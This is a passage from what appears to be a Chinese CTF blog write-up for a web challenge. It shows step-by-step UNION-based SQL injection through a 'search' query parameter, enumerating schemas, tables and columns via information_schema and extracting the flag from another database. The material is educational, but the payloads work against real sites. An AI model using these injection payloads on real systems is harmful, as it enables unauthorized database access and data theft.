<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查表：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;aliens&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182059382.png" alt="image-20230418204730031"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询一下表的字段：</span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;amazonis_planitia&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182048708.png" alt="image-20230418204842681"></p>
<p>试试查一下里面的东西，发现没flag</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(id) <span class="keyword">from</span> amazonis_planitia</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(name) <span class="keyword">from</span> amazonis_planitia</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>amazonis_planitia <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(description) <span class="keyword">from</span> amazonis_planitia</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050580.png" alt="image-20230418205008546"></p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050742.png" alt="image-20230418205028698"></p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182050692.png" alt="image-20230418205044641"></p>
<p>后来查了一下，发现数据库差错了…………</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/query?search=amazonis_planitia union select database(),group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182059557.png" alt="image-20230418205905532"></p>
<p>重复以上步骤即可，选择alien_code这个库</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182100103.png" alt="image-20230418210034076"></p>
<p><strong>表名为code</strong></p>
<p><strong>字段也为code</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span>query?<span class="keyword">search</span><span class="operator">=</span>hesperia_planum <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(code) <span class="keyword">from</span> alien_code.code</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这里注意因为不是当前的数据库，表名前面需要加数据库的前缀</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182104348.png" alt="image-20230418210416319"></p>
<p>参考：<a href="https://blog.csdn.net/m0_62905261/article/details/126097708">https://blog.csdn.net/m0_62905261/article/details/126097708</a></p>
<p>参考另外一个wp用sqlmap也能查出一些东西</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304182135908.png"></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
  </entry>
</search>
